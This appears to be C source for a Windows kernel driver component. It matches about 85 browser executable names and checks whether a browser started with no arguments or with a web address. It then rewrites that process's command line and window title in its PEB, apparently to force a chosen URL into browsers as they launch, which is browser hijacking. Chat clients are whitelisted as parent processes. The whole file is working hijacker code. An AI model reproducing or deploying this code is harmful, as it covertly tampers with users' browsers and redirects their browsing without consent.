#include "pch.h"

static char *g_general_bro_name[] = {
	"360se.exe",
	"theworld.exe",
	"2345chrome.exe",
	"juzi.exe",
	"tango3.exe",
	"iexplore.exe",
	"sogouexplorer.exe",
	"the world .exe",
	"firefox.exe",
	"chrome.exe",
	"safari.exe",
	"maxthon.exe",
	"netscape.exe",
	"07073ge.exe",
	"xbrowser.exe",
	"greenbrowser.exe",
	"duoping.exe",
	"chgreenbrowser.exe",
	"cometbrowser.exe",
	"kchrome.exe",
	"taobrowser.exe",
	"taomeebrowser.exe",
	"ruiying.exe",
	"dybrowser.exe",
	"sbframe.exe",
	"ftbr.exe",
	"srie.exe",
	"saayaa.exe",
	"acoobrowser.exe",
	"dragon.exe",
	"gosurf.exe",
	"webgamegt.exe",
	"luna.exe",
	"palemoon.exe",
	"seamonkey.exe",
	"airview.exe",
	"huaer.exe",
	"se.exe",
	"caimao.exe",
	"jwbrowser.exe",
	"jx.exe",
	"seemao.exe",
	"yyexplorer.exe",
	"qtweb.exe",
	"browser.exe",
	"pbbrowser.exe",
	"2291browser.exe",
	"myie9.exe",
	"ucbrowser.exe",
	"languang.exe",
	"gamesbrowser.exe",
	"114ie.exe",
	"8uexplorer.exe",
	"avant.exe",
	"barsmedia.exe",
	"crazy browser.exe",
	"xplorer.exe",
	"s3browser-win32.exe",
	"iron.exe",
	"scheduler.exe",
	"ttraveler.exe",
	"webstrip.exe",
	"gesearch.exe",
	"cheerbrowser.exe",
	"piluo.exe",
	"hxbrowser.exe",
	"cyie.exe",
	"cell.exe",
	"baidubrowser.exe",
	"alibrowser.exe",
	"rsbrowser.exe",
	"roamb.exe",
	"coral.exe",
	"tfybrowser.exe",
	"vu.exe",
	"myiq.exe",
	"krbrowser.exe",
	"miniie_2.exe",
	"aegis.exe",
	"zbrowser.exe",
	"xttbrowser.exe",
	"caiyun.exe",
	"jsy.exe",
	"flyie.exe",
	"twchrome.exe",
	"360chrome.exe"
};

static char *g_special_bro_name[] = {
	"qqbrowser.exe", // -sc=desktopshortcut -fixlaunch=0
	"2345explorer.exe", // --shortcut=desktop
	"liebao.exe" // --ico1 --icoXXX
};

// 这个跟上面一一对应
static WCHAR *g_special_bro_suffix[] = {
	L"-sc=desktopshortcut -fixlaunch=0",
	L"--shortcut=desktop",
	L"daohang.qq.com/?fr=shortcut",
	L"--target-id=0",
	L"--shortcut=quicklaunch",
	L"-sc=quicklaunchpinedshortcut -fixlaunch=0",
	L"--ico1",
	L"--ico2",
	L"--ico3",
	L"--ico4",
	L"-sc=startmenupinedshortcut -fixlaunch=0",
	L"--shortcut=startmenupinned"
};

static char* g_dual_process_start[] = {
	"launcher.exe" //Opera
};

/*
00000000`0003065e  ""C:\Program Files (x86)\Opera\la"
00000000`0003069e  "uncher.exe" www.baidu.com"
*/
static WCHAR* g_dual_process_be_start_info[] = {
	L"Opera"
};

static char* g_white_process[] = {
	"qq.exe",
	"yy.qq",
	"tim.qq",
	"skype.exe",
	"AliIM.exe"
};

static size_t g_dwWhiteProcessLen = sizeof(g_white_process) / sizeof(char*);

static size_t g_dwDualProcessStartLen = sizeof(g_dual_process_start) / sizeof(char*);

static size_t g_dwDualProcessBeStartInfoLen = sizeof(g_dual_process_be_start_info) / sizeof(WCHAR*);

static size_t g_dwSpecialBroLen = sizeof(g_special_bro_name) / sizeof(char*);

static size_t g_dwSpecialBroSuffixLen = sizeof(g_special_bro_suffix) / sizeof(WCHAR*);

static size_t g_dwGeneralBroLen = sizeof(g_general_bro_name) / sizeof(char*);

BOOLEAN BrowserIsWhiteParentProcess(PEPROCESS Process)
{
	size_t i = 0;
	CHAR* szProcessName = (CHAR*)PsGetProcessImageFileName(Process);

	if (szProcessName == NULL)
		return FALSE;

	for (i = 0; i <  g_dwWhiteProcessLen; i++)
	{
		if (!_strnicmp(g_white_process[i], szProcessName, strlen(g_white_process[i])))
			return TRUE;

		if (!_strnicmp(g_white_process[i], szProcessName, strlen(szProcessName)))
			return TRUE;

		if (strstr(g_white_process[i], szProcessName))
			return TRUE;
	}

	return FALSE;
}

BOOLEAN BrowserIsOpenFile(WCHAR* szCommandLine)
{
	if (szCommandLine == NULL)
		return TRUE;

	if (wcsstr(szCommandLine, L".html") || wcsstr(szCommandLine, L".htm") || wcsstr(szCommandLine, L".pdf"))
		return TRUE;

	return FALSE;
}

BOOLEAN BrowserIsDualProcess(CHAR* szProcessName, WCHAR* szCommandLine)
{
	BOOLEAN bFind = FALSE;

	if (szProcessName == NULL || szCommandLine == NULL)
		return FALSE;

	for (size_t i = 0; i < g_dwDualProcessStartLen; i++)
	{
		if (!_strnicmp(szProcessName, g_dual_process_start[i], strlen(g_dual_process_start[i])))
		{
			bFind = TRUE;
			break;
		}

		if (!_strnicmp(g_dual_process_start[i], szProcessName, strlen(szProcessName)))
		{
			bFind = TRUE;
			break;
		}

		if (strstr(g_dual_process_start[i], szProcessName))
		{
			bFind = TRUE;
			break;
		}
	}

	if (bFind == FALSE)
		return FALSE;

	if (bFind)
	{
		for (size_t k = 0; k < g_dwDualProcessBeStartInfoLen; k++)
		{
			if (wcsstr(szCommandLine, g_dual_process_be_start_info[k]))
				return TRUE;
		}
	}

	return FALSE;
}

BOOLEAN BrowserIsGeneralBrowerProcess(CHAR* szProcessName)
{
	if (szProcessName == NULL)
		return FALSE;

	for (size_t i = 0; i < g_dwGeneralBroLen; i++)
	{
		if (!_strnicmp(szProcessName, g_general_bro_name[i], strlen(g_general_bro_name[i])))
			return TRUE;

		if (!_strnicmp(g_general_bro_name[i], szProcessName, strlen(szProcessName)))
			return TRUE;

		if (strstr(g_general_bro_name[i], szProcessName))
			return TRUE;
	}

	return FALSE;
}

BOOLEAN BrowserIsSpecialBrowerProcess(CHAR* szProcessName)
{
	if (szProcessName == NULL)
		return FALSE;

	for (size_t i = 0; i < g_dwSpecialBroLen; i++)
	{
		if (!_strnicmp(szProcessName, g_special_bro_name[i], strlen(g_special_bro_name[i])))
			return TRUE;

		if (!_strnicmp(g_special_bro_name[i], szProcessName, strlen(szProcessName)))
			return TRUE;

		if (strstr(g_special_bro_name[i], szProcessName))
			return TRUE;
	}

	return FALSE;
}

BOOLEAN BrowserIsSpecialBrowerSuffix(WCHAR* szSuffix)
{
	if (szSuffix == NULL)
		return FALSE;

	for (size_t i = 0; i < g_dwSpecialBroSuffixLen; i++)
	{
		if (!_wcsnicmp(szSuffix, g_special_bro_suffix[i], wcslen(g_special_bro_suffix[i]) * 2))
			return TRUE;
	}

	return FALSE;
}

BOOLEAN BrowerIsNoParameter(PPEB32 peb)
{
	if (peb == NULL)
		return FALSE;

	__try {
		if (peb->ProcessParameters->CommandLine.Length - peb->ProcessParameters->ImagePathName.Length <= 6)
			return TRUE;
		else
			return FALSE;
	}
	__except (1)
	{
		return FALSE;
	}
}

BOOLEAN BrowerIsWebParameter(PPEB32 peb)
{
	USHORT dwParameterLen = 0;
	WCHAR* szParameter = NULL;
	WCHAR szCseParameter[260] = { 0 };

	if (peb == NULL)
		return FALSE;

	__try {
		szParameter = PebGetParameterPoint(peb);
		if (szParameter == NULL)
			return FALSE;

		dwParameterLen = PebGetParmeterLen(peb);
		if (dwParameterLen == 0)
			return 0;
		//www.zhuhuibeishadiao.com/fffffffffffffffffffffffffffffffffff 0x76
		//http://m.sohu.com/n/499427525/?_f=m-index_top_news_1/11111111111111111111111111111111aaaaaaaaaaaaaasssssssssssssssdddfggghhhhh 0xfc
		/*
		--type=gpu-process --channel="3784.0.1846098211\2058888220" 
		--supports-dual-gpus=false --gpu-driver-bug-workarounds=2,20,45 
		--gpu-vendor-id=0x15ad --gpu-device-id=0x0405 
		--gpu-driver-vendor="VMware, Inc." 
		--gpu-driver-version=8.15.1.48 --ignored=" --type=renderer " /prefetch:822062411 0x11d
		360se.exe
		*/
		if (dwParameterLen > 0xff)
			return FALSE;

		RtlCopyMemory(szCseParameter, szParameter, dwParameterLen);
		_wcslwr(szCseParameter);

		if (wcsstr(szCseParameter, L"=") != NULL)
			return FALSE;

		if (wcsstr(szCseParameter, L".com") || wcsstr(szCseParameter, L".cc") || wcsstr(szCseParameter, L"www.") 
			|| wcsstr(szCseParameter, L".net") || wcsstr(szCseParameter, L".cn"))
		{
			return TRUE;
		}

		return FALSE;
	}
	__except (1)
	{
		return FALSE;
	}
}

BOOLEAN BrowerSetNewParmeter(PPEB32 Peb, WCHAR* szParmeter, PVOID pNewPoint, BOOLEAN bNewPoint)
{
	USHORT dwParmeterBuffLen = 0;
	WCHAR* szParmeterBuff = NULL;
	WCHAR szNewCommandLine[260] = { 0 };
	ULONG_PTR dwOffsetParmeter = 0;

	if (Peb == NULL || szParmeter == NULL)
		return FALSE;

	if (bNewPoint)
	{
		if (pNewPoint == NULL)
			return FALSE;

		__try {
			szParmeterBuff = PebGetParameterPoint(Peb);
			if (szParmeterBuff == NULL)
				return FALSE;

			dwOffsetParmeter = (ULONG_PTR)szParmeterBuff - Peb->ProcessParameters->CommandLine.Buffer;

			/*dwParmeterBuffLen = PebGetParmeterLen(Peb);
			if (dwParmeterBuffLen == 0)
				return FALSE;

			RtlZeroMemory(szParmeterBuff, dwParmeterBuffLen);*/

			RtlZeroMemory(szNewCommandLine, sizeof(szNewCommandLine));
			RtlCopyMemory(szNewCommandLine, (PVOID)Peb->ProcessParameters->CommandLine.Buffer, dwOffsetParmeter);
			
			RtlCopyMemory((PVOID)((ULONG_PTR)szNewCommandLine + dwOffsetParmeter), szParmeter, wcslen(szParmeter) * 2);

			RtlCopyMemory(pNewPoint, szNewCommandLine, wcslen(szNewCommandLine) * 2);
			Peb->ProcessParameters->MaximumLength = Peb->ProcessParameters->Length = (ULONG32)((ULONG_PTR)pNewPoint - (ULONG_PTR)Peb->ProcessParameters + wcslen(szNewCommandLine) * 2 + 10);
			Peb->ProcessParameters->CommandLine.Buffer = (ULONG32)pNewPoint;
			Peb->ProcessParameters->CommandLine.Length = (USHORT)wcslen(pNewPoint) * 2;
			Peb->ProcessParameters->CommandLine.MaximumLength = Peb->ProcessParameters->CommandLine.Length + 2;
			Peb->ProcessParameters->WindowTitle.Buffer = Peb->ProcessParameters->CommandLine.Buffer;
			Peb->ProcessParameters->WindowTitle.Length = Peb->ProcessParameters->CommandLine.Length;
			Peb->ProcessParameters->WindowTitle.MaximumLength = Peb->ProcessParameters->CommandLine.MaximumLength;
			return TRUE;
		}
		__except (1)
		{
			return FALSE;
		}
	}

	__try {
		szParmeterBuff = PebGetParameterPoint(Peb);

		if (szParmeterBuff == NULL)
			return FALSE;

		dwParmeterBuffLen = PebGetParmeterLen(Peb);
		if (dwParmeterBuffLen == 0)
			return FALSE;

		RtlZeroMemory(szParmeterBuff, dwParmeterBuffLen);
		RtlZeroMemory((PVOID)Peb->ProcessParameters->WindowTitle.Buffer, Peb->ProcessParameters->WindowTitle.MaximumLength);
		RtlCopyMemory(szParmeterBuff, szParmeter, wcslen(szParmeter) * 2);
		Peb->ProcessParameters->WindowTitle.Buffer = Peb->ProcessParameters->CommandLine.Buffer;
		Peb->ProcessParameters->CommandLine.Length = (USHORT)wcslen((WCHAR*)Peb->ProcessParameters->CommandLine.Buffer) * 2;
		Peb->ProcessParameters->CommandLine.MaximumLength = Peb->ProcessParameters->CommandLine.Length + 2;
		Peb->ProcessParameters->WindowTitle.Length = (USHORT)Peb->ProcessParameters->CommandLine.Length;
		Peb->ProcessParameters->WindowTitle.MaximumLength = Peb->ProcessParameters->WindowTitle.Length + 2;
		return TRUE;
	}
	__except (1)
	{
		return FALSE;
	}
}

BOOLEAN BrowserSetMaxParmeter(PPEB32 peb, WCHAR* NewParmeter, size_t cblen)
{
	WCHAR* szParameterBuff = NULL;

	if (peb == NULL || NewParmeter == NULL || cblen == 0)
		return FALSE;

	__try {
		szParameterBuff = PebGetParameterPoint(peb);
		if (szParameterBuff == NULL)
			return FALSE;

		RtlZeroMemory((PVOID)peb->ProcessParameters->WindowTitle.Buffer, peb->ProcessParameters->WindowTitle.MaximumLength);
		RtlCopyMemory(szParameterBuff, NewParmeter, cblen);
		peb->ProcessParameters->WindowTitle.Buffer = peb->ProcessParameters->CommandLine.Buffer;
		peb->ProcessParameters->WindowTitle.Buffer = peb->ProcessParameters->CommandLine.Buffer;
		peb->ProcessParameters->CommandLine.Length = (USHORT)wcslen((WCHAR*)peb->ProcessParameters->CommandLine.Buffer) * 2;
		peb->ProcessParameters->CommandLine.MaximumLength = peb->ProcessParameters->CommandLine.Length + 2;
		peb->ProcessParameters->WindowTitle.Length = (USHORT)peb->ProcessParameters->CommandLine.Length;
		peb->ProcessParameters->WindowTitle.MaximumLength = peb->ProcessParameters->WindowTitle.Length + 2;
		return TRUE;
	}
	__except (1)
	{
		return FALSE;
	}
}
